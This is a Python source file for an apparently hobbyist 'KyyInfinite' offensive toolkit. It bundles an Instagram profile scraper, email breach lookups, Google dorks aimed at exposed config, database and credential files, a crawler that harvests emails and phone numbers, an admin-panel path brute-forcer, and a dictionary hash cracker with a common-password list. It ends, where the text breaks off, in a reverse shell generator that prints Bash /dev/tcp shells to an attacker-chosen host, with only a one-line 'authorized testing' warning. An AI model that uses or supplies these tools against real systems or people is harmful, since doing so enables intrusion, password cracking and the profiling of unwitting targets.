#!/usr/bin/env python3
# ╔════════════════════════════════════════════════════════════╗
# ║  KyyInfinite Python Engine v3.0                           ║
# ║  Advanced Tools powered by Python                         ║
# ║  Author: KyyInfinite                                      ║
# ║  Integrated with kyy-core.sh framework                    ║
# ╚════════════════════════════════════════════════════════════╝

import sys
import os
import json
import time
import hashlib
import base64
import random
import string
import socket
import struct
import re
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════
#  COLOR & UI SYSTEM
# ═══════════════════════════════════════════

class Color:
    RST     = '\033[0m'
    BLD     = '\033[1m'
    DIM     = '\033[2m'
    ITA     = '\033[3m'
    UND     = '\033[4m'
    
    # Foreground
    BK  = '\033[30m';  R  = '\033[31m';  G  = '\033[32m';  Y  = '\033[33m'
    B   = '\033[34m';  M  = '\033[35m';  C  = '\033[36m';  WH = '\033[37m'
    
    # Bright
    RB  = '\033[91m';  GB = '\033[92m';  YB = '\033[93m'
    BB  = '\033[94m';  MB = '\033[95m';  CB = '\033[96m';  WB = '\033[97m'
    
    # Background
    BGR = '\033[41m';  BGG = '\033[42m';  BGY = '\033[43m'
    BGB = '\033[44m';  BGM = '\033[45m';  BGC = '\033[46m'
    
    # 256 color
    @staticmethod
    def c256(n): return f'\033[38;5;{n}m'
    
    @staticmethod
    def bg256(n): return f'\033[48;5;{n}m'
    
    @staticmethod
    def rgb(r, g, b): return f'\033[38;2;{r};{g};{b}m'

c = Color

class UI:
    @staticmethod
    def banner(title):
        print()
        print(f"    {c.c256(33)}{'═' * 52}{c.RST}")
        print(f"    {c.c256(33)}║{c.RST}  {c.BLD}{c.c256(39)}◆ {title} ◆{c.RST}")
        print(f"    {c.c256(33)}{'═' * 52}{c.RST}")
        print()
    
    @staticmethod
    def box_top(w=52, title=""):
        print(f"    {c.c256(240)}╔{'═' * (w-2)}╗{c.RST}")
        if title:
            pad = w - 4 - len(title)
            print(f"    {c.c256(240)}║{c.RST} {c.BLD}{c.c256(39)}{title}{c.RST}{' ' * pad}{c.c256(240)}║{c.RST}")
            print(f"    {c.c256(240)}╠{'═' * (w-2)}╣{c.RST}")
    
    @staticmethod
    def box_line(w=52, text=""):
        clean = re.sub(r'\033\[[0-9;]*m', '', text)
        pad = w - 3 - len(clean)
        if pad < 0: pad = 0
        print(f"    {c.c256(240)}║{c.RST} {text}{' ' * pad}{c.c256(240)}║{c.RST}")
    
    @staticmethod
    def box_empty(w=52):
        print(f"    {c.c256(240)}║{' ' * (w-2)}║{c.RST}")
    
    @staticmethod
    def box_sep(w=52):
        print(f"    {c.c256(240)}╟{'─' * (w-2)}╢{c.RST}")
    
    @staticmethod
    def box_bottom(w=52):
        print(f"    {c.c256(240)}╚{'═' * (w-2)}╝{c.RST}")
    
    @staticmethod
    def success(msg): print(f"    {c.GB}✓ {c.WH}{msg}{c.RST}")
    
    @staticmethod
    def error(msg): print(f"    {c.RB}✗ {c.WH}{msg}{c.RST}")
    
    @staticmethod
    def warn(msg): print(f"    {c.YB}⚠ {c.WH}{msg}{c.RST}")
    
    @staticmethod
    def info(msg): print(f"    {c.CB}ℹ {c.WH}{msg}{c.RST}")
    
    @staticmethod
    def progress(text, duration=2):
        width = 35
        for i in range(width + 1):
            pct = i * 100 // width
            bar = '█' * i + '░' * (width - i)
            colors = [c.c256(196), c.c256(208), c.c256(226), c.c256(46)]
            col = colors[min(i * len(colors) // (width + 1), len(colors) - 1)]
            sys.stdout.write(f"\r    {c.c256(245)}{text} {c.c256(240)}▐{col}{bar}{c.c256(240)}▌ {col}{pct:3d}%{c.RST}")
            sys.stdout.flush()
            time.sleep(duration / width)
        print(f" {c.GB}✓{c.RST}")
    
    @staticmethod
    def spinner(text, duration=2):
        frames = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
        end = time.time() + duration
        i = 0
        while time.time() < end:
            sys.stdout.write(f"\r    {c.c256(213)}{frames[i]} {c.c256(87)}{text}{c.RST}  ")
            sys.stdout.flush()
            i = (i + 1) % len(frames)
            time.sleep(0.1)
        print(f"\r    {c.GB}✓ {c.WH}{text}{c.RST}                    ")
    
    @staticmethod
    def input_prompt(text):
        return input(f"    {c.YB}⮞ {text}: {c.GB}")
    
    @staticmethod
    def pause():
        input(f"\n    {c.YB}Press [ENTER] to continue...{c.RST}")


# ═══════════════════════════════════════════
#  HTTP HELPER
# ═══════════════════════════════════════════

def http_get(url, timeout=10, headers=None):
    """Simple HTTP GET tanpa dependency external"""
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode('utf-8', errors='ignore'), resp.status, dict(resp.headers)
    except Exception as e:
        return str(e), 0, {}

def http_head(url, timeout=8):
    try:
        req = urllib.request.Request(url, method='HEAD')
        req.add_header('User-Agent', 'Mozilla/5.0')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, {}
    except:
        return 0, {}


# ═══════════════════════════════════════════
#  TOOL 01: INSTAGRAM PROFILE SCRAPER
# ═══════════════════════════════════════════

def tool_instagram_scraper():
    UI.banner("📸 INSTAGRAM PROFILE SCRAPER")
    
    username = UI.input_prompt("Instagram username")
    print(c.RST)
    
    if not username:
        UI.error("Username kosong!")
        return
    
    UI.spinner("Fetching Instagram profile...", 2)
    
    url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers_custom = {
        'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    # Try multiple methods
    profile_data = {}
    
    # Method 1: Public API
    body, status, _ = http_get(url, headers=headers_custom)
    if status == 200:
        try:
            data = json.loads(body)
            user = data.get('data', {}).get('user', {})
            profile_data = {
                'username': user.get('username', 'N/A'),
                'full_name': user.get('full_name', 'N/A'),
                'bio': user.get('biography', 'N/A'),
                'followers': user.get('edge_followed_by', {}).get('count', 'N/A'),
                'following': user.get('edge_follow', {}).get('count', 'N/A'),
                'posts': user.get('edge_owner_to_timeline_media', {}).get('count', 'N/A'),
                'is_private': user.get('is_private', 'N/A'),
                'is_verified': user.get('is_verified', 'N/A'),
                'external_url': user.get('external_url', 'N/A'),
                'profile_pic': user.get('profile_pic_url_hd', 'N/A'),
                'business': user.get('is_business_account', False),
                'category': user.get('category_name', 'N/A'),
                'id': user.get('id', 'N/A'),
            }
        except:
            pass
    
    # Method 2: Fallback - scrape page
    if not profile_data:
        body2, status2, _ = http_get(f"https://www.instagram.com/{username}/")
        if status2 == 200:
            # Extract from meta tags
            try:
                followers = re.search(r'([\d,.]+)\s*Followers', body2)
                following = re.search(r'([\d,.]+)\s*Following', body2)
                posts = re.search(r'([\d,.]+)\s*Posts', body2)
                title = re.search(r'<title>(.*?)</title>', body2)
                desc = re.search(r'<meta property="og:description" content="(.*?)"', body2)
                
                profile_data = {
                    'username': username,
                    'full_name': title.group(1).split('(')[0].strip() if title else 'N/A',
                    'bio': desc.group(1) if desc else 'N/A',
                    'followers': followers.group(1) if followers else 'N/A',
                    'following': following.group(1) if following else 'N/A',
                    'posts': posts.group(1) if posts else 'N/A',
                }
            except:
                pass
    
    if not profile_data:
        # Method 3: Use third-party API
        body3, status3, _ = http_get(f"https://igapi.me/api/user/{username}")
        if status3 == 200:
            try:
                data3 = json.loads(body3)
                profile_data = {
                    'username': data3.get('username', username),
                    'full_name': data3.get('full_name', 'N/A'),
                    'followers': data3.get('followers', 'N/A'),
                    'following': data3.get('following', 'N/A'),
                    'posts': data3.get('media_count', 'N/A'),
                }
            except:
                profile_data = {'username': username, 'note': 'Limited data available'}
    
    # Display
    w = 52
    UI.box_top(w, f"INSTAGRAM — @{username}")
    UI.box_empty(w)
    
    for key, value in profile_data.items():
        if key == 'profile_pic':
            continue
        display_key = key.replace('_', ' ').title()
        val_str = str(value)
        if isinstance(value, bool):
            val_str = f"{c.GB}Yes" if value else f"{c.RB}No"
        elif isinstance(value, int) and value > 1000:
            if value > 1000000:
                val_str = f"{value/1000000:.1f}M"
            elif value > 1000:
                val_str = f"{value/1000:.1f}K"
        
        UI.box_line(w, f" {c.YB}{display_key:14s}{c.c256(245)}: {c.GB}{val_str}{c.RST}")
    
    UI.box_empty(w)
    UI.box_sep(w)
    UI.box_line(w, f" {c.c256(245)}Profile URL: {c.c256(87)}instagram.com/{username}{c.RST}")
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 02: EMAIL BREACH CHECKER
# ═══════════════════════════════════════════

def tool_email_breach():
    UI.banner("🔓 EMAIL BREACH CHECKER")
    
    email = UI.input_prompt("Email address")
    print(c.RST)
    
    if not email:
        UI.error("Email kosong!")
        return
    
    UI.spinner("Checking data breaches...", 3)
    
    # Method 1: HaveIBeenPwned (limited without API key)
    sha1_hash = hashlib.sha1(email.encode()).hexdigest().upper()
    prefix = sha1_hash[:5]
    suffix = sha1_hash[5:]
    
    results = {
        'email': email,
        'sha1': sha1_hash,
        'domain': email.split('@')[-1],
        'breaches': [],
        'password_exposed': False
    }
    
    # Check password (k-anonymity)
    pwd_body, pwd_status, _ = http_get(f"https://api.pwnedpasswords.com/range/{prefix}")
    if pwd_status == 200:
        for line in pwd_body.splitlines():
            h, count = line.strip().split(':')
            if h == suffix:
                results['password_exposed'] = True
                results['exposure_count'] = int(count)
                break
    
    # Check breaches via alternative APIs
    breach_body, breach_status, _ = http_get(
        f"https://api.xposedornot.com/v1/check-email/{email}"
    )
    if breach_status == 200:
        try:
            breach_data = json.loads(breach_body)
            if 'breaches' in breach_data:
                results['breaches'] = breach_data['breaches'][:10]
        except:
            pass
    
    # Also try leak-lookup style
    leak_body, leak_status, _ = http_get(
        f"https://leakcheck.io/api/public?check={email}"
    )
    if leak_status == 200:
        try:
            leak_data = json.loads(leak_body)
            if leak_data.get('found'):
                results['leak_sources'] = leak_data.get('sources', [])
        except:
            pass
    
    # Display
    w = 52
    UI.box_top(w, "BREACH ANALYSIS")
    UI.box_empty(w)
    UI.box_line(w, f" {c.YB}Email     {c.c256(245)}: {c.c256(87)}{email}{c.RST}")
    UI.box_line(w, f" {c.YB}Domain    {c.c256(245)}: {c.c256(87)}{results['domain']}{c.RST}")
    UI.box_line(w, f" {c.YB}SHA1      {c.c256(245)}: {c.c256(245)}{sha1_hash[:20]}...{c.RST}")
    UI.box_sep(w)
    
    if results.get('password_exposed'):
        UI.box_line(w, f" {c.RB}⚠  PASSWORD EXPOSED!{c.RST}")
        UI.box_line(w, f"   {c.c256(245)}Found in {c.RB}{results.get('exposure_count', '?')}{c.c256(245)} data breaches{c.RST}")
    else:
        UI.box_line(w, f" {c.GB}✓  Password not found in known breaches{c.RST}")
    
    UI.box_sep(w)
    
    if results['breaches']:
        UI.box_line(w, f" {c.c256(213)}Known Breaches:{c.RST}")
        for breach in results['breaches'][:8]:
            name = breach if isinstance(breach, str) else str(breach)
            UI.box_line(w, f"   {c.RB}● {c.WH}{name[:40]}{c.RST}")
    else:
        UI.box_line(w, f" {c.c256(245)}No specific breach data available{c.RST}")
        UI.box_line(w, f" {c.c256(245)}(Full check requires API key){c.RST}")
    
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 03: GOOGLE DORKING AUTOMATOR
# ═══════════════════════════════════════════

def tool_google_dork():
    UI.banner("🔎 GOOGLE DORKING AUTOMATOR")
    
    target = UI.input_prompt("Target domain (e.g. example.com)")
    print(c.RST)
    
    if not target:
        UI.error("Target kosong!")
        return
    
    dorks = {
        "Login Pages": f'site:{target} inurl:login OR inurl:signin OR inurl:admin',
        "Exposed Files": f'site:{target} filetype:pdf OR filetype:doc OR filetype:xls',
        "Config Files": f'site:{target} filetype:env OR filetype:yml OR filetype:conf',
        "SQL Files": f'site:{target} filetype:sql OR filetype:db OR filetype:bak',
        "Log Files": f'site:{target} filetype:log',
        "PHP Errors": f'site:{target} "PHP Parse error" OR "PHP Warning"',
        "Directories": f'site:{target} intitle:"index of"',
        "Subdomains": f'site:*.{target} -www',
        "Sensitive Pages": f'site:{target} inurl:admin OR inurl:dashboard OR inurl:panel',
        "Database Exposure": f'site:{target} inurl:phpmyadmin OR inurl:adminer',
        "Git Exposure": f'site:{target} inurl:.git',
        "Backup Files": f'site:{target} filetype:bak OR filetype:old OR filetype:backup',
        "API Endpoints": f'site:{target} inurl:api OR inurl:v1 OR inurl:v2',
        "WordPress": f'site:{target} inurl:wp-content OR inurl:wp-admin',
        "Email Addresses": f'site:{target} intext:@{target}',
        "Camera/IoT": f'site:{target} inurl:view.shtml OR intitle:"live view"',
        "Error Messages": f'site:{target} "error" OR "warning" OR "fatal"',
        "Pastebin Leaks": f'site:pastebin.com "{target}"',
        "GitHub Leaks": f'site:github.com "{target}" password OR secret OR key',
        "Trello Boards": f'site:trello.com "{target}"',
    }
    
    w = 56
    UI.box_top(w, f"GOOGLE DORKS — {target}")
    UI.box_empty(w)
    
    for i, (name, dork) in enumerate(dorks.items(), 1):
        num = f"{i:02d}"
        UI.box_line(w, f" {c.GB}[{c.WH}{num}{c.GB}]{c.RST} {c.c256(87)}{name}{c.RST}")
        encoded = urllib.parse.quote(dork)
        url = f"https://google.com/search?q={encoded}"
        UI.box_line(w, f"     {c.c256(240)}{dork[:44]}{c.RST}")
        UI.box_line(w, "")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.YB}Tip:{c.c256(245)} Copy dork & paste in browser{c.RST}")
    UI.box_empty(w)
    UI.box_bottom(w)
    
    # Export option
    print()
    export = UI.input_prompt("Export dorks to file? [y/n]")
    print(c.RST)
    if export.lower() == 'y':
        filepath = os.path.expanduser(f"~/dorks_{target}_{int(time.time())}.txt")
        with open(filepath, 'w') as f:
            f.write(f"Google Dorks for: {target}\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"By: KyyInfinite Framework\n")
            f.write("=" * 50 + "\n\n")
            for name, dork in dorks.items():
                url = f"https://google.com/search?q={urllib.parse.quote(dork)}"
                f.write(f"[{name}]\n{dork}\nURL: {url}\n\n")
        UI.success(f"Exported to: {filepath}")


# ═══════════════════════════════════════════
#  TOOL 04: WEBSITE CRAWLER & LINK EXTRACTOR
# ═══════════════════════════════════════════

def tool_web_crawler():
    UI.banner("🕷️ WEBSITE CRAWLER & LINK EXTRACTOR")
    
    url = UI.input_prompt("Target URL")
    print(c.RST)
    
    if not url:
        UI.error("URL kosong!")
        return
    
    if not url.startswith('http'):
        url = 'https://' + url
    
    UI.progress("Crawling website...", 2)
    
    body, status, headers = http_get(url)
    
    if status == 0:
        UI.error(f"Failed to fetch: {body}")
        return
    
    # Extract all links
    links = set(re.findall(r'href=["\']([^"\']+)["\']', body))
    scripts = set(re.findall(r'src=["\']([^"\']+\.js)["\']', body))
    images = set(re.findall(r'src=["\']([^"\']+\.(jpg|jpeg|png|gif|svg|webp))["\']', body))
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', body)
    emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', body))
    phones = set(re.findall(r'[\+]?[(]?[0-9]{1,4}[)]?[-\s./0-9]{7,15}', body))
    comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
    
    # Categorize links
    internal = set()
    external = set()
    domain = urllib.parse.urlparse(url).netloc
    
    for link in links:
        if link.startswith('#') or link.startswith('javascript:'):
            continue
        if link.startswith('/') or domain in link:
            internal.add(link)
        elif link.startswith('http'):
            external.add(link)
    
    # Display
    w = 56
    UI.box_top(w, f"CRAWL RESULTS — {domain}")
    UI.box_empty(w)
    UI.box_line(w, f" {c.YB}URL          {c.c256(245)}: {c.c256(87)}{url[:35]}{c.RST}")
    UI.box_line(w, f" {c.YB}Status       {c.c256(245)}: {c.GB}{status}{c.RST}")
    UI.box_line(w, f" {c.YB}Page Size    {c.c256(245)}: {c.c256(87)}{len(body):,} bytes{c.RST}")
    UI.box_sep(w)
    
    UI.box_line(w, f" {c.c256(213)}📊 SUMMARY{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Internal Links : {c.GB}{len(internal)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}External Links : {c.c256(87)}{len(external)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Scripts (JS)   : {c.YB}{len(scripts)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Images         : {c.c256(87)}{len(images)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Forms          : {c.YB}{len(forms)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Emails Found   : {c.RB}{len(emails)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}Phones Found   : {c.c256(87)}{len(phones)}{c.RST}")
    UI.box_line(w, f"   {c.c256(245)}HTML Comments  : {c.c256(245)}{len(comments)}{c.RST}")
    
    if emails:
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}📧 EMAILS FOUND{c.RST}")
        for email in list(emails)[:10]:
            UI.box_line(w, f"   {c.GB}● {c.WH}{email}{c.RST}")
    
    if external:
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}🔗 EXTERNAL LINKS (top 10){c.RST}")
        for link in list(external)[:10]:
            UI.box_line(w, f"   {c.c256(87)}→ {c.WH}{link[:44]}{c.RST}")
    
    if comments:
        UI.box_sep(w)
        UI.box_line(w, f" {c.c256(213)}💬 HTML COMMENTS (hidden info){c.RST}")
        for comment in comments[:5]:
            clean = comment.strip()[:44]
            UI.box_line(w, f"   {c.c256(245)}<!-- {clean} -->{c.RST}")
    
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 05: IMAGE EXIF/METADATA EXTRACTOR
# ═══════════════════════════════════════════

def tool_exif_extractor():
    UI.banner("📷 IMAGE EXIF/METADATA EXTRACTOR")
    
    filepath = UI.input_prompt("Image file path")
    print(c.RST)
    
    if not filepath or not os.path.isfile(filepath):
        UI.error("File not found!")
        return
    
    UI.spinner("Extracting metadata...", 2)
    
    metadata = {}
    file_stat = os.stat(filepath)
    
    # Basic file info
    metadata['Filename'] = os.path.basename(filepath)
    metadata['File Size'] = f"{file_stat.st_size:,} bytes ({file_stat.st_size/1024:.1f} KB)"
    metadata['Created'] = datetime.fromtimestamp(file_stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S')
    metadata['Modified'] = datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
    
    # Read EXIF from JPEG
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Check file type
        if data[:2] == b'\xff\xd8':
            metadata['Format'] = 'JPEG'
        elif data[:4] == b'\x89PNG':
            metadata['Format'] = 'PNG'
        elif data[:4] == b'GIF8':
            metadata['Format'] = 'GIF'
        elif data[:4] == b'RIFF':
            metadata['Format'] = 'WebP'
        else:
            metadata['Format'] = 'Unknown'
        
        # Extract JPEG EXIF
        if data[:2] == b'\xff\xd8':
            # Find EXIF marker
            exif_start = data.find(b'Exif\x00\x00')
            if exif_start != -1:
                metadata['Has EXIF'] = 'Yes'
                
                # Extract common text patterns
                # Camera make
                make_match = re.search(rb'(Canon|Nikon|Sony|Samsung|Apple|Huawei|Xiaomi|OPPO|vivo|Google|OnePlus|LG|Motorola|Nokia)', data)
                if make_match:
                    metadata['Camera Make'] = make_match.group(1).decode('ascii', errors='ignore')
                
                # GPS coordinates (simplified extraction)
                gps_match = re.search(rb'GPS', data)
                if gps_match:
                    metadata['Has GPS'] = 'Yes (location data embedded!)'
                
                # Software
                sw_match = re.search(rb'(Adobe Photoshop|GIMP|Lightroom|Snapseed|Instagram|VSCO)', data)
                if sw_match:
                    metadata['Software'] = sw_match.group(1).decode('ascii', errors='ignore')
                
                # Date
                date_match = re.search(rb'(\d{4}):(\d{2}):(\d{2}) (\d{2}):(\d{2}):(\d{2})', data)
                if date_match:
                    metadata['EXIF Date'] = date_match.group(0).decode('ascii')
            else:
                metadata['Has EXIF'] = 'No'
        
        # Image dimensions (for JPEG)
        if metadata.get('Format') == 'JPEG':
            i = 0
            while i < len(data) - 1:
                if data[i] == 0xFF and data[i+1] in (0xC0, 0xC2):
                    height = struct.unpack('>H', data[i+5:i+7])[0]
                    width = struct.unpack('>H', data[i+7:i+9])[0]
                    metadata['Dimensions'] = f"{width} x {height} px"
                    metadata['Megapixels'] = f"{(width * height) / 1000000:.1f} MP"
                    break
                i += 1
        
        # PNG dimensions
        elif metadata.get('Format') == 'PNG':
            width = struct.unpack('>I', data[16:20])[0]
            height = struct.unpack('>I', data[20:24])[0]
            metadata['Dimensions'] = f"{width} x {height} px"
            metadata['Megapixels'] = f"{(width * height) / 1000000:.1f} MP"
        
        # MD5 hash
        metadata['MD5 Hash'] = hashlib.md5(data).hexdigest()
        metadata['SHA256'] = hashlib.sha256(data).hexdigest()[:32] + '...'
        
    except Exception as e:
        metadata['Error'] = str(e)
    
    # Display
    w = 52
    UI.box_top(w, "IMAGE METADATA")
    UI.box_empty(w)
    
    for key, value in metadata.items():
        color = c.GB
        if 'GPS' in key: color = c.RB
        if 'Error' in key: color = c.RB
        UI.box_line(w, f" {c.YB}{key:15s}{c.c256(245)}: {color}{value}{c.RST}")
    
    UI.box_empty(w)
    UI.box_bottom(w)
    
    if metadata.get('Has GPS') == 'Yes (location data embedded!)':
        print()
        UI.warn("⚠ This image contains GPS location data!")
        UI.warn("Anyone can find where this photo was taken!")


# ═══════════════════════════════════════════
#  TOOL 06: ADMIN PANEL FINDER
# ═══════════════════════════════════════════

def tool_admin_finder():
    UI.banner("🔐 ADMIN PANEL FINDER")
    
    target = UI.input_prompt("Target URL (e.g. example.com)")
    print(c.RST)
    
    if not target:
        UI.error("Target kosong!")
        return
    
    if not target.startswith('http'):
        target = 'https://' + target
    target = target.rstrip('/')
    
    admin_paths = [
        '/admin', '/admin/', '/administrator', '/admin/login',
        '/admin.php', '/admin.html', '/adminpanel', '/admin/index',
        '/login', '/login.php', '/signin', '/user/login',
        '/wp-admin', '/wp-login.php', '/wp-admin/',
        '/dashboard', '/dashboard/', '/panel', '/panel/',
        '/cpanel', '/controlpanel', '/manage', '/management',
        '/backend', '/backoffice', '/admin/dashboard',
        '/admin/cp', '/admin/controlpanel', '/admin/admin',
        '/administrator/login', '/administrator/index',
        '/phpmyadmin', '/pma', '/mysql', '/myadmin',
        '/adm', '/admin1', '/admin2', '/admin3',
        '/user', '/users', '/account', '/accounts',
        '/members', '/member', '/staff', '/moderator',
        '/cms', '/cms/admin', '/site/admin',
        '/manager', '/manager/', '/webadmin',
        '/sysadmin', '/siteadmin', '/system',
        '/config', '/configuration', '/setup',
        '/_admin', '/Admin', '/ADMIN',
        '/admin/login.php', '/admin/signin',
        '/api/admin', '/api/v1/admin',
        '/portal', '/portal/admin',
        '/auth', '/auth/login', '/authenticate',
    ]
    
    UI.progress(f"Scanning {len(admin_paths)} paths...", 2)
    print()
    
    w = 52
    UI.box_top(w, f"SCAN — {urllib.parse.urlparse(target).netloc}")
    UI.box_empty(w)
    UI.box_line(w, f" {c.YB}TARGET   {c.c256(245)}: {c.c256(87)}{target}{c.RST}")
    UI.box_line(w, f" {c.YB}PATHS    {c.c256(245)}: {c.c256(87)}{len(admin_paths)}{c.RST}")
    UI.box_line(w, f" {c.YB}STARTED  {c.c256(245)}: {c.c256(87)}{datetime.now().strftime('%H:%M:%S')}{c.RST}")
    UI.box_sep(w)
    
    found = []
    scanned = 0
    
    for path in admin_paths:
        scanned += 1
        full_url = target + path
        
        sys.stdout.write(f"\r    {c.c256(245)}[{scanned}/{len(admin_paths)}] Testing: {path[:30]}{' ' * 20}{c.RST}")
        sys.stdout.flush()
        
        try:
            status, _ = http_head(full_url, timeout=5)
            
            if status in (200, 301, 302, 403):
                status_text = {200: 'FOUND ✓', 301: 'REDIRECT', 302: 'REDIRECT', 403: 'FORBIDDEN'}
                status_color = {200: c.GB, 301: c.YB, 302: c.YB, 403: c.RB}
                
                found.append((path, status, full_url))
                print(f"\r    {status_color.get(status, c.WH)}[{status}] {c.WH}{path}{c.RST}{' ' * 30}")
        except:
            pass
    
    print(f"\r{' ' * 70}")
    
    UI.box_sep(w)
    
    if found:
        UI.box_line(w, f" {c.c256(213)}🎯 FOUND ({len(found)} results){c.RST}")
        for path, status, url in found:
            sc = c.GB if status == 200 else (c.YB if status in (301,302) else c.RB)
            UI.box_line(w, f"   {sc}[{status}]{c.RST} {c.WH}{path}{c.RST}")
            UI.box_line(w, f"         {c.c256(245)}{url[:40]}{c.RST}")
    else:
        UI.box_line(w, f" {c.c256(245)}No admin panels found.{c.RST}")
    
    UI.box_sep(w)
    UI.box_line(w, f" {c.c256(245)}Finished: {datetime.now().strftime('%H:%M:%S')}{c.RST}")
    UI.box_empty(w)
    UI.box_bottom(w)


# ═══════════════════════════════════════════
#  TOOL 07: HASH CRACKER (DICTIONARY)
# ═══════════════════════════════════════════

def tool_hash_cracker():
    UI.banner("🔓 HASH CRACKER — DICTIONARY ATTACK")
    
    hash_input = UI.input_prompt("Hash to crack")
    print(c.RST)
    
    if not hash_input:
        UI.error("Hash kosong!")
        return
    
    # Identify hash type
    hash_len = len(hash_input)
    hash_types = {32: 'md5', 40: 'sha1', 64: 'sha256', 128: 'sha512'}
    detected = hash_types.get(hash_len, 'unknown')
    
    UI.info(f"Detected hash type: {detected.upper()} (length: {hash_len})")
    
    # Built-in common passwords wordlist
    common_passwords = [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "michael", "shadow", "123123", "654321", "superman",
        "qazwsx", "football", "password1", "password123", "admin",
        "admin123", "root", "toor", "pass", "test",
        "guest", "master", "changeme", "1234", "12345",
        "123456789", "1234567890", "qwerty123", "1q2w3e4r",
        "111111", "000000", "666666", "888888", "999999",
        "121212", "123321", "abcdef", "access", "hello",
        "love", "welcome", "ninja", "princess", "starwars",
        "login", "passw0rd", "P@ssw0rd", "Summer2023", "Winter2024",
    ]
    
    # Custom wordlist
    print()
    custom_wl = UI.input_prompt("Custom wordlist path (or ENTER for built-in)")
    print(c.RST)
    
    wordlist = common_passwords
    if custom_wl and os.path.isfile(custom_wl):
        with open(custom_wl, 'r', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        UI.info(f"Loaded {len(wordlist)} words from {custom_wl}")
    else:
        UI.info(f"Using built-in wordlist ({len(wordlist)} words)")
    
    # Also generate variations
    variations = []
    for pwd in wordlist[:100]:
        variations.append(pwd)
        variations.append(pwd.upper())
        variations.append(pwd.capitalize())
        variations.append(pwd + "1")
        variations.append(pwd + "123")
        variations.append(pwd + "!")
        variations.append(pwd + "2024")
        variations.append(pwd + "2025")
    
    all_words = list(set(wordlist + variations))
    
    print()
    UI.progress(f"Cracking ({len(all_words)} candidates)...", 2)
    print()
    
    hash_funcs = {
        'md5': hashlib.md5,
        'sha1': hashlib.sha1,
        'sha256': hashlib.sha256,
        'sha512': hashlib.sha512,
    }
    
    found = False
    tested = 0
    start_time = time.time()
    
    for word in all_words:
        tested += 1
        
        if tested % 200 == 0:
            speed = tested / (time.time() - start_time + 0.001)
            sys.stdout.write(f"\r    {c.c256(245)}[{tested}/{len(all_words)}] Speed: {speed:.0f} h/s | Testing: {word[:20]}{' ' * 15}{c.RST}")
            sys.stdout.flush()
        
        if detected != 'unknown':
            h = hash_funcs[detected](word.encode()).hexdigest()
            if h == hash_input.lower():
                found = True
                elapsed = time.time() - start_time
                print(f"\r{' ' * 70}")
                print()
                
                w = 52
                UI.box_top(w, "🎉 HASH CRACKED!")
                UI.box_empty(w)
                UI.box_line(w, f" {c.YB}Hash      {c.c256(245)}: {c.c256(87)}{hash_input[:35]}{c.RST}")
                UI.box_line(w, f" {c.YB}Type      {c.c256(245)}: {c.GB}{detected.upper()}{c.RST}")
                UI.box_line(w, f" {c.YB}Password  {c.c256(245)}: {c.RB}{c.BLD}{word}{c.RST}")
                UI.box_line(w, f" {c.YB}Tested    {c.c256(245)}: {c.c256(87)}{tested} candidates{c.RST}")
                UI.box_line(w, f" {c.YB}Time      {c.c256(245)}: {c.c256(87)}{elapsed:.2f}s{c.RST}")
                UI.box_line(w, f" {c.YB}Speed     {c.c256(245)}: {c.c256(87)}{tested/elapsed:.0f} hash/s{c.RST}")
                UI.box_empty(w)
                UI.box_bottom(w)
                break
        else:
            # Try all hash types
            for hname, hfunc in hash_funcs.items():
                h = hfunc(word.encode()).hexdigest()
                if h == hash_input.lower():
                    found = True
                    print(f"\r\n    {c.GB}CRACKED! [{hname.upper()}] → {c.RB}{c.BLD}{word}{c.RST}")
                    break
            if found:
                break
    
    if not found:
        elapsed = time.time() - start_time
        print(f"\r{' ' * 70}")
        print()
        UI.error(f"Hash not cracked. Tested {tested} in {elapsed:.2f}s")
        UI.info("Try with a larger wordlist (e.g. rockyou.txt)")


# ═══════════════════════════════════════════
#  TOOL 08: REVERSE SHELL GENERATOR
# ═══════════════════════════════════════════

def tool_reverse_shell():
    UI.banner("🐚 REVERSE SHELL GENERATOR")
    
    UI.warn("For authorized penetration testing only!")
    print()
    
    lhost = UI.input_prompt("Your IP (LHOST)")
    lport = UI.input_prompt("Your Port (LPORT, default 4444)")
    print(c.RST)
    
    lport = lport or "4444"
    
    if not lhost:
        UI.error("IP required!")
        return
    
    shells = {
        "Bash TCP": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
        "Bash UDP": f"""bash -i >& /dev/udp/{lhost}/{lport} 0>&1""",
